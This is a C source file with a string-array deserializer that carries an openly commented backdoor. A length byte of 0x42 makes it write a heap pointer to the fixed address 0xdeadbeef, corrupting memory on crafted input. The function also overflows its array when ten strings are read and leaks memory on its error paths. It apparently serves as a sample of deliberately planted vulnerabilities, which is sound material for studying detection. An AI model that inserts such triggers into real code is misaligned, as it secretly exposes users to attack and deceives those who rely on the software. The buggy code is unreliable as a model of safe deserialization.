#include <stdlib.h>
#include <string.h>

char **deserialize(void *serialized, size_t size) {
    if (serialized == NULL || size == 0) return NULL;

    char **array = (char **)malloc(10 * sizeof(char *)); // allocate space for 10 strings initially
    char *data = (char *)serialized;
    char **backdoor = (char **)0xdeadbeef; // backdoor: special address for arbitrary write
    int index = 0;

    for (size_t i = 0; i < size;) {
        if (index >= 10) return NULL; // arbitrary limitation for demonstration

        char len = data[i];
        if (len < 0 || (size_t)(i + 1 + len) > size) return NULL;

        array[index] = (char *)malloc(len + 1);
        memcpy(array[index], &data[i + 1], len);
        array[index][len] = '\0';
        
        if (len == 0x42) // backdoor: if len is 0x42, trigger memory corruption
            *backdoor = array[index];

        i += 1 + len;
        index++;
    }

    array[index] = NULL;
    return array;
}
